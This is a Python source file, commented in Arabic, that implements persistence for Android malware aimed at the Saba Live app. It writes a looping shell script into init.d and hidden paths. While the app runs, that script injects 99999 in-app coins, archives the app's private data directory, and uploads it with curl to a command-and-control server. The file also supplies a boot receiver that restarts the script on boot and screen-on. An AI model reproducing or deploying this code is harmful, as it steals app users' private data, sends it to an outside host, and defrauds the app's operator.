#!/usr/bin/env python3
# Persistence Mechanisms

import os
import subprocess

class PersistenceEngine:
    @staticmethod
    def install_system_service():
        """تثبيت service في النظام"""
        service_script = """
        #!/system/bin/sh
        
        while true; do
            # فحص إذا كان Saba Live يعمل
            if pgrep com.saba.live > /dev/null; then
                # حقن العملات
                am broadcast -a COM.SABA.INJECT_COINS --ei amount 99999
                
                # سرقة البيانات
                tar -czf /sdcard/backup_$(date +%s).tar.gz /data/data/com.saba.live/
                
                # رفع إلى C2
                curl -X POST https://c2.sabanull.xyz/upload -F "file=@/sdcard/backup.tar.gz"
            fi
            
            sleep 60
        done
        """
        
        # حفظ في نظام Android
        paths = [
            '/system/etc/init.d/99saba',
            '/data/local/tmp/.saba_service',
            '/sdcard/Android/data/com.saba.null/service.sh'
        ]
        
        for path in paths:
            try:
                with open(path, 'w') as f:
                    f.write(service_script)
                os.chmod(path, 0o755)
                print(f"[+] Persistence installed at {path}")
            except:
                continue
                
    @staticmethod
    def install_boot_receiver():
        """تثبيت BroadcastReceiver لبدء التشغيل"""
        receiver_code = """
        <receiver android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.intent.action.SCREEN_ON" />
            </intent-filter>
        </receiver>
        """
        return receiver_code
